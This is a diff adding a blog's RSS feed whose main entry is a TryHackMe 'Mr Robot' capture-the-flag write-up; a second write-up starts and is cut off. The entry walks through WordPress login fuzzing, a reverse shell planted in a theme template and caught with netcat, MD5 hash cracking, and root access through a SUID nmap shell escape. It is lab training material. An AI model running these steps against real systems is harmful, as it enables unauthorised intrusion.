@@ -1,0 +1,1134 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Medium on 0000FF</title><link>https://simonefelici.github.io/categories/medium/</link><description>Recent content in Medium on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 22 Jan 2024 16:00:00 +0100</lastBuildDate><atom:link href="https://simonefelici.github.io/categories/medium/index.xml" rel="self" type="application/rss+xml"/><item><title>Mr Robot CTF Writeup THM</title><link>https://simonefelici.github.io/p/mr-robot-ctf-writeup-thm/</link><pubDate>Mon, 22 Jan 2024 16:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/mr-robot-ctf-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1582266255765-fa5cf1a1d501?q=80&amp;w=2670&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Mr Robot CTF Writeup THM" />&lt;p>First of all I am going to do an nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sC -sV -p- 10.10.81.92
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-22 05:44 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.81.92
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.055s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65532&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp closed ssh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Site doesn&lt;span class="s1">&amp;#39;t have a title (text/html).
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">|_http-server-header: Apache
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">443/tcp open ssl/http Apache httpd
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">|_http-title: Site doesn&amp;#39;&lt;/span>t have a title &lt;span class="o">(&lt;/span>text/html&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>www.example.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2015-09-16T10:45:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2025-09-13T10:45:03
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 123.10 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here we can see port 80 and 443 open.&lt;/p>
+&lt;p>So I am going to expplore the web page.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>This is the content of the web page.&lt;/p>
+&lt;p>From this point I just went and enumerate the webpage.&lt;/p>
+&lt;p>I also found the robots.txt which leads to the first flag.&lt;/p>
+&lt;p>inside the robots.txt there is also the location to a dictionary:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sort Downloads/fsocity.dic &lt;span class="p">|&lt;/span> uniq &amp;gt; uniq.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I ran this command because there were repeated words.&lt;/p>
+&lt;p>So, now I just need the username.&lt;/p>
+&lt;p>I tried with wpscan but I got nothing, So I tried to FUZZ the username with the sictionary, which if it is in the wordlist, should get a different response size, because wordpress tells you if is just the password that is wrong.&lt;/p>
+&lt;p>And that’s exactly what happened:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%201.png"
+loading="lazy"
+alt="pg"
+>&lt;/p>
+&lt;p>So, now I think of running the fuzzer again, with the username Elliot and with the dictionary as a password.&lt;/p>
+&lt;p>And we got the password:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/pg.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>And I got in, from there I could create a reverse shell, but first let’s explore the dashboard.&lt;/p>
+&lt;p>In the Users section wee see that there is another User:&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%203.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Maybe it can be helpful later.&lt;/p>
+&lt;p>We can create a reverse shell just by copy and paste the pentestermonkey reverse shell, in the 404 template.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/MrRobot-writeup-THM/main/10acf195-4b40-4784-b6ca-297837c219bf_Export-7dd7dc58-f580-4cb4-9c34-999e6801e5e5/Mr%20Robot%20CTF%200771358915314dfa9159586ad03a2c0a/Untitled%204.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Then start the listener in the machine and we are in:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.11.65.91&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.81.92&lt;span class="o">]&lt;/span> &lt;span class="m">50199&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux linux 3.13.0-55-generic &lt;span class="c1">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 12:10:26 up 1:29, &lt;span class="m">0&lt;/span> users, load average: 0.00, 0.88, 2.66
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">(&lt;/span>daemon&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">(&lt;/span>daemon&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">(&lt;/span>daemon&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh: 0: can&lt;span class="err">&amp;#39;&lt;/span>t access tty&lt;span class="p">;&lt;/span> job control turned off
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">daemon
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We have 2 users:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/passwd &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;home&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:x:101:104::/home/syslog:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql:x:1001:1001::/home/mysql:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">varnish:x:999:999::/home/varnish:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robot:x:1002:1002::/home/robot:
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>We can’t cd into varnish, but we can cd in robot.&lt;/p>
+&lt;p>in his home we have 2 files:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -la
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">total &lt;span class="m">16&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxr-xr-x &lt;span class="m">2&lt;/span> root root &lt;span class="m">4096&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">drwxr-xr-x &lt;span class="m">3&lt;/span> root root &lt;span class="m">4096&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> ..
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-r-------- &lt;span class="m">1&lt;/span> robot robot &lt;span class="m">33&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> key-2-of-3.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> robot robot &lt;span class="m">39&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> password.raw-md5
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As we can see the first one can be opened only by robot, but the second one can be read by anyone:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat password.raw-md5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robot:&amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And looks like we got the md5 hash of robot&lt;/p>
+&lt;p>And we can simply brute force it:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">john --format&lt;span class="o">=&lt;/span>Raw-md5 pass.txt --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>Raw-MD5 &lt;span class="o">[&lt;/span>MD5 128/128 AVX 4x3&lt;span class="o">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: no OpenMP support &lt;span class="k">for&lt;/span> this &lt;span class="nb">hash&lt;/span> type, consider --fork&lt;span class="o">=&lt;/span>&lt;span class="m">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;redacted&amp;gt; &lt;span class="o">(&lt;/span>robot&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:00:00 DONE &lt;span class="o">(&lt;/span>2024-01-22 07:19&lt;span class="o">)&lt;/span> 100.0g/s 4051Kp/s 4051Kc/s 4051KC/s bonjour1..123092
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show --format=Raw-MD5&amp;#34;&lt;/span> options to display all of the cracked passwords reliably
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session completed.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Using that we can use the command “su” to authenticate ourself as robot:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">su robot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: &amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robot
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After doing some enumeration, I noticed that we got a strange SUID:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find / -type f -perm -04000 -ls 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15068&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44168&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /bin/ping
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15093&lt;/span> &lt;span class="m">68&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">69120&lt;/span> Feb &lt;span class="m">12&lt;/span> &lt;span class="m">2015&lt;/span> /bin/umount
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15060&lt;/span> &lt;span class="m">96&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">94792&lt;/span> Feb &lt;span class="m">12&lt;/span> &lt;span class="m">2015&lt;/span> /bin/mount
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15069&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">44680&lt;/span> May &lt;span class="m">7&lt;/span> &lt;span class="m">2014&lt;/span> /bin/ping6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15085&lt;/span> &lt;span class="m">40&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">36936&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /bin/su
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36231&lt;/span> &lt;span class="m">48&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">47032&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36216&lt;/span> &lt;span class="m">32&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">32464&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/newgrp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36041&lt;/span> &lt;span class="m">44&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">41336&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/chsh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36038&lt;/span> &lt;span class="m">48&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">46424&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/chfn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36148&lt;/span> &lt;span class="m">68&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">68152&lt;/span> Feb &lt;span class="m">17&lt;/span> &lt;span class="m">2014&lt;/span> /usr/bin/gpasswd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36349&lt;/span> &lt;span class="m">152&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">155008&lt;/span> Mar &lt;span class="m">12&lt;/span> &lt;span class="m">2015&lt;/span> /usr/bin/sudo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">34835&lt;/span> &lt;span class="m">496&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">504736&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> /usr/local/bin/nmap
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">38768&lt;/span> &lt;span class="m">432&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">440416&lt;/span> May &lt;span class="m">12&lt;/span> &lt;span class="m">2014&lt;/span> /usr/lib/openssh/ssh-keysign
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">38526&lt;/span> &lt;span class="m">12&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">10240&lt;/span> Feb &lt;span class="m">25&lt;/span> &lt;span class="m">2014&lt;/span> /usr/lib/eject/dmcrypt-get-device
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">395259&lt;/span> &lt;span class="m">12&lt;/span> -r-sr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">9532&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">395286&lt;/span> &lt;span class="m">16&lt;/span> -r-sr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">14320&lt;/span> Nov &lt;span class="m">13&lt;/span> &lt;span class="m">2015&lt;/span> /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">38505&lt;/span> &lt;span class="m">12&lt;/span> -rwsr-xr-x &lt;span class="m">1&lt;/span> root root &lt;span class="m">10344&lt;/span> Feb &lt;span class="m">25&lt;/span> &lt;span class="m">2015&lt;/span> /usr/lib/pt_chown
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Nmap can be used in interactive mode:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap --interactive
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting nmap V. 3.81 &lt;span class="o">(&lt;/span> http://www.insecure.org/nmap/ &lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; &lt;span class="k">for&lt;/span> &lt;span class="nb">help&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap&amp;gt; !sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># whoami&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And after that we just want to go in the /root directory and retrieve the flag.&lt;/p></description></item><item><title>Gatekeeper Writeup THM</title><link>https://simonefelici.github.io/p/gatekeeper-writeup-thm/</link><pubDate>Wed, 03 Jan 2024 16:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/gatekeeper-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1580047750144-2c7790adf461?q=80&amp;w=2670&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Gatekeeper Writeup THM" />&lt;p>First of all we do a nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
